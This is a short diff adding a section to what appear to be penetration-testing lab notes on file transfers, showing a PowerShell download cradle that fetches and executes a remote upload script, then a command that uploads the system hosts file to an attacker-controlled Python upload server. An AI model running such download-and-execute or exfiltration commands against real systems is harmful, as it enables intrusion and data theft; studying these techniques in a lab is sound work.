@@ -235,3 +235,13 @@ python3 -m uploadserver
 File upload available at /upload
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
+
+#### Using Powershell Script to Upload File to Python Upload Server
+```powershell
+PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+
+PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
+
+[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
+[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
+```
